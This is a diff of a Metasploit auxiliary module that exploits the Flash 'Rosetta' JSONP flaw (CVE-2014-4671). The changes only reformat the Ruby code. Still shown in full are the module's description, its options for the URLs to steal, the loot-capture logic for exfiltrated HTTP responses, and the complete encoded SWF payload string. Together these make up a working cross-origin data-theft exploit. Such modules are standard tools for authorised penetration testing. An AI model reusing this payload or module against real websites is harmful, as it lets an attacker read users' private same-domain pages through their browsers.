@@ -10,33 +10,36 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Report
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'           => 'Flash "Rosetta" JSONP GET/POST Response Disclosure',
-      'Description'    => %q{
-        A website that serves a JSONP endpoint that accepts a custom alphanumeric
-        callback of 1200 chars can be abused to serve an encoded swf payload that
-        steals the contents of a same-domain URL. Flash < 14.0.0.145 is required.
+    super(
+      update_info(
+        info,
+        'Name' => 'Flash "Rosetta" JSONP GET/POST Response Disclosure',
+        'Description' => %q{
+          A website that serves a JSONP endpoint that accepts a custom alphanumeric
+          callback of 1200 chars can be abused to serve an encoded swf payload that
+          steals the contents of a same-domain URL. Flash < 14.0.0.145 is required.
 
-        This module spins up a web server that, upon navigation from a user, attempts
-        to abuse the specified JSONP endpoint URLs by stealing the response from
-        GET requests to STEAL_URLS.
-      },
-      'License'        => MSF_LICENSE,
-      'Author'         => [
-        'Michele Spagnuolo', # discovery, wrote rosetta encoder, disclosure
-        'joev' # metasploit module
-      ],
-      'References'     =>
-        [
+          This module spins up a web server that, upon navigation from a user, attempts
+          to abuse the specified JSONP endpoint URLs by stealing the response from
+          GET requests to STEAL_URLS.
+        },
+        'License' => MSF_LICENSE,
+        'Author' => [
+          'Michele Spagnuolo', # discovery, wrote rosetta encoder, disclosure
+          'joev' # metasploit module
+        ],
+        'References' => [
           ['CVE', '2014-4671'],
           ['URL', 'http://miki.it/blog/2014/7/8/abusing-jsonp-with-rosetta-flash/'],
           ['URL', 'https://github.com/mikispag/rosettaflash'],
           ['URL', 'http://quaxio.com/jsonp_handcrafted_flash_files/']
         ],
-      'DisclosureDate' => '2014-07-08',
-      'Actions'        => [[ 'WebServer', 'Description' => 'Serve exploit via web server' ]],
-      'PassiveActions' => [ 'WebServer' ],
-      'DefaultAction'  => 'WebServer'))
+        'DisclosureDate' => '2014-07-08',
+        'Actions' => [[ 'WebServer', 'Description' => 'Serve exploit via web server' ]],
+        'PassiveActions' => [ 'WebServer' ],
+        'DefaultAction' => 'WebServer'
+      )
+    )
 
     register_options(
       [
@@ -46,7 +49,8 @@ class MetasploitModule < Msf::Auxiliary
         OptString.new('STEAL_URLS', [ true, 'A comma-separated list of URLs to steal', '' ]),
         OptString.new('URIPATH', [ true, 'The URI path to serve the exploit under', '/' ])
       ],
-      self.class)
+      self.class
+    )
   end
 
   def run
@@ -81,7 +85,7 @@ class MetasploitModule < Msf::Auxiliary
       file = store_loot(
         "html", "text/plain", cli.peerhost, body, "flash_jsonp_rosetta", "Exfiltrated HTTP response"
       )
-      url = body.lines.first.gsub(/.*?=/,'')
+      url = body.lines.first.gsub(/.*?=/, '')
       print_good "#{body.length} bytes captured from target #{cli.peerhost} on URL:\n#{url}"
       print_good "Stored in #{file}"
     else
@@ -96,7 +100,7 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def exploit_html
-    ex_url = URI.escape(get_uri.chomp('/')+'/'+Rex::Text.rand_text_alphanumeric(6+rand(20))+'.log')
+    ex_url = URI.escape(get_uri.chomp('/') + '/' + Rex::Text.rand_text_alphanumeric(6 + rand(20)) + '.log')
     %Q|
       <!doctype html>
       <html>
@@ -154,33 +158,33 @@ class MetasploitModule < Msf::Auxiliary
   #
   def encoded_swf
     "CWSMIKI0hCD0Up0IZUnnnnnnnnnnnnnnnnnnnUU5nnnnnn3Snn7iiudIbEAt333swW0s" \
-    "sG03sDDtDDDt0333333Gt333swwv3wwwFPOHtoHHvwHHFhH3D0Up0IZUnnnnnnnnnnnn" \
-    "nnnnnnnUU5nnnnnn3Snn7YNqdIbeUUUfV13333sDT133333333WEDDT13s03WVqefXAx" \
-    "oookD8f8888T0CiudIbEAt33swwWpt03sDGDDDwwwtttttwwwGDt33333www033333Gf" \
-    "BDRhHHUccUSsgSkKoe5D0Up0IZUnnnnnnnnnnnnnnnnnnnUU5nnnnnn3Snn7mNqdIbe1" \
-    "WUUfV133sUUpDDUUDDUUDTUEDTEDUTUE0GUUD133333333sUEe1sfzA87TLx888znN8t" \
-    "8F8fV6v0CiudIbEAtwwWDt03sDG0sDtDDDtwwtGwpttGwwt33333333w0333GDfBDFzA" \
-    "HZYqqEHeYAHtHyIAnEHnHNVEJRlHIYqEqEmIVHlqzfjzYyHqQLzEzHVMvnAEYzEVHMHT" \
-    "HbB2D0Up0IZUnnnnnnnnnnnnnnnnnnnUU5nnnnnn3Snn7CiudIbEAtwuDtDtDDtpDGpD" \
-    "DG0sDtwtwDDGDGtGpDDGwG33sptDDDtGDD33333s03sdFPZHyVQflQfrqzfHRBZHAqzf" \
-    "HaznQHzIIHljjVEJYqIbAzvyHwXHDHtTToXHGhwXHDhtwXHDHWdHHhHxLHXaFHNHwXHD" \
-    "Xt7D0Up0IZUnnnnnnnnnnnnnnnnnnnUU5nnnnnn3Snn7iiudIbEAt333wwE0GDtwpDtD" \
-    "DGDGtG033sDDwGpDDGtDt033sDDt3333g3sFPXHLxcZWXHKHGlHLDthHHHLXAGXHLxcG" \
-    "XHLdSkhHxvGXHDxskhHHGhHXCWXHEHGDHLTDHmGDHDxLTAcGlHthHHHDhLtSvgXH7D0U" \
-    "p0IZUnnnnnnnnnnnnnnnnnnnUU5nnnnnn3Snn7YNqdIbeV133333333333333333gF03" \
-    "sDeqUfzAoE80CiudIbEAtwwW3sD3w0sDt0wwGDDGpDtptDDtGwwGpDDtDDDGDDD33333" \
-    "sG033gFPHHmODHDHttMWhHhVODHDhtTwBHHhHxUHHksSHoHOTHTHHHHtLuWhHXVODHDX" \
-    "tlwBHHhHDUHXKscHCHOXHtXnOXH4D0Up0IZUnnnnnnnnnnnnnnnnnnnUU5nnnnnn3Snn" \
-    "7CiudIbEAtwwuwG333spDtDDGDDDt0333st0GGDDt33333www03sdFPlWJoXHgHOTHTH" \
-    "HHHtLGwhHxfOdHDx4D0Up0IZUnnnnnnnnnnnnnnnnnnnUU5nnnnnn3Snn7CiudIbEAtu" \
-    "wttD333swG0wDDDw03333sDt33333sG03sDDdFPtdXvwhHdLGwhHxhGWwDHdlxXdhvwh" \
-    "HdTg7D0Up0IZUnnnnnnnnnnnnnnnnnnnUU5nnnnnn3Snn7CiudIbEAt333swwE03GDtD" \
-    "wG0wpDG03sGDDD33333sw033gFPlHtxHHHDxLrkvKwTHLJDXLxAwlHtxHHHDXLjkvKwD" \
-    "HDHLZWBHHhHxmHXgGHVHwXHLHA7D0Up0IZUnnnnnnnnnnnnnnnnnnnUU5nnnnnn3Snn7" \
-    "CiudIbEAtsWt3wGww03GDttwtDDtDtwDwGDwGDttDDDwDtwwtG0GDtGpDDt33333www0" \
-    "33GdFPlHLjDXthHHHLHqeeobHthHHHXDhtxHHHLZafHQxQHHHOvHDHyMIuiCyIYEHWSs" \
-    "gHmHKcskHoXHLHwhHHfoXHLhnotHthHHHLXnoXHLxUfH1D0Up0IZUnnnnnnnnnnnnnnn" \
-    "nnnnUU5nnnnnn3SnnwWNqdIbe133333333333333333WfF03sTeqefXA888ooo04Cx9"
+      "sG03sDDtDDDt0333333Gt333swwv3wwwFPOHtoHHvwHHFhH3D0Up0IZUnnnnnnnnnnnn" \
+      "nnnnnnnUU5nnnnnn3Snn7YNqdIbeUUUfV13333sDT133333333WEDDT13s03WVqefXAx" \
+      "oookD8f8888T0CiudIbEAt33swwWpt03sDGDDDwwwtttttwwwGDt33333www033333Gf" \
+      "BDRhHHUccUSsgSkKoe5D0Up0IZUnnnnnnnnnnnnnnnnnnnUU5nnnnnn3Snn7mNqdIbe1" \
+      "WUUfV133sUUpDDUUDDUUDTUEDTEDUTUE0GUUD133333333sUEe1sfzA87TLx888znN8t" \
+      "8F8fV6v0CiudIbEAtwwWDt03sDG0sDtDDDtwwtGwpttGwwt33333333w0333GDfBDFzA" \
+      "HZYqqEHeYAHtHyIAnEHnHNVEJRlHIYqEqEmIVHlqzfjzYyHqQLzEzHVMvnAEYzEVHMHT" \
+      "HbB2D0Up0IZUnnnnnnnnnnnnnnnnnnnUU5nnnnnn3Snn7CiudIbEAtwuDtDtDDtpDGpD" \
+      "DG0sDtwtwDDGDGtGpDDGwG33sptDDDtGDD33333s03sdFPZHyVQflQfrqzfHRBZHAqzf" \
+      "HaznQHzIIHljjVEJYqIbAzvyHwXHDHtTToXHGhwXHDhtwXHDHWdHHhHxLHXaFHNHwXHD" \
+      "Xt7D0Up0IZUnnnnnnnnnnnnnnnnnnnUU5nnnnnn3Snn7iiudIbEAt333wwE0GDtwpDtD" \
+      "DGDGtG033sDDwGpDDGtDt033sDDt3333g3sFPXHLxcZWXHKHGlHLDthHHHLXAGXHLxcG" \
+      "XHLdSkhHxvGXHDxskhHHGhHXCWXHEHGDHLTDHmGDHDxLTAcGlHthHHHDhLtSvgXH7D0U" \
+      "p0IZUnnnnnnnnnnnnnnnnnnnUU5nnnnnn3Snn7YNqdIbeV133333333333333333gF03" \
+      "sDeqUfzAoE80CiudIbEAtwwW3sD3w0sDt0wwGDDGpDtptDDtGwwGpDDtDDDGDDD33333" \
+      "sG033gFPHHmODHDHttMWhHhVODHDhtTwBHHhHxUHHksSHoHOTHTHHHHtLuWhHXVODHDX" \
+      "tlwBHHhHDUHXKscHCHOXHtXnOXH4D0Up0IZUnnnnnnnnnnnnnnnnnnnUU5nnnnnn3Snn" \
+      "7CiudIbEAtwwuwG333spDtDDGDDDt0333st0GGDDt33333www03sdFPlWJoXHgHOTHTH" \
+      "HHHtLGwhHxfOdHDx4D0Up0IZUnnnnnnnnnnnnnnnnnnnUU5nnnnnn3Snn7CiudIbEAtu" \
+      "wttD333swG0wDDDw03333sDt33333sG03sDDdFPtdXvwhHdLGwhHxhGWwDHdlxXdhvwh" \
+      "HdTg7D0Up0IZUnnnnnnnnnnnnnnnnnnnUU5nnnnnn3Snn7CiudIbEAt333swwE03GDtD" \
+      "wG0wpDG03sGDDD33333sw033gFPlHtxHHHDxLrkvKwTHLJDXLxAwlHtxHHHDXLjkvKwD" \
+      "HDHLZWBHHhHxmHXgGHVHwXHLHA7D0Up0IZUnnnnnnnnnnnnnnnnnnnUU5nnnnnn3Snn7" \
+      "CiudIbEAtsWt3wGww03GDttwtDDtDtwDwGDwGDttDDDwDtwwtG0GDtGpDDt33333www0" \
+      "33GdFPlHLjDXthHHHLHqeeobHthHHHXDhtxHHHLZafHQxQHHHOvHDHyMIuiCyIYEHWSs" \
+      "gHmHKcskHoXHLHwhHHfoXHLhnotHthHHHLXnoXHLxUfH1D0Up0IZUnnnnnnnnnnnnnnn" \
+      "nnnnUU5nnnnnn3SnnwWNqdIbe133333333333333333WfF03sTeqefXA888ooo04Cx9"
   end
 
   def crossdomain_xml
